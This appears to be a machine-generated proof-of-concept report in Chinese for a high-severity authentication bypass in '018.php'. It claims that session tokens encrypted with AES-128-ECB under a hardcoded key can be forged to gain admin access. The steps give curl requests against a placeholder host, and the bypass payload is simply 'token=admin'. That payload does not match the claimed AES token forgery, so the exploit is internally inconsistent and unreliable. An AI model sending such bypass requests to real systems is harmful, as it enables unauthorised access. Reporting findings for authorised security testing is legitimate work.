# POC — 018.php 使用 AES-128-ECB 加密会话令牌且硬编码密钥，可伪造 admin 令牌绕过认证

- finding_id: `LLM-67cf74d71eb3`
- type: `auth_bypass` / CWE-287
- severity: `high`
- file: `018.php:32`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/018.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 认证绕过 载荷**  
```http
curl -sS -i -X POST 'http://TARGET:8080/018.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'token=admin'
```
预期：以未授权/伪造身份访问受保护资源返回 2xx。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。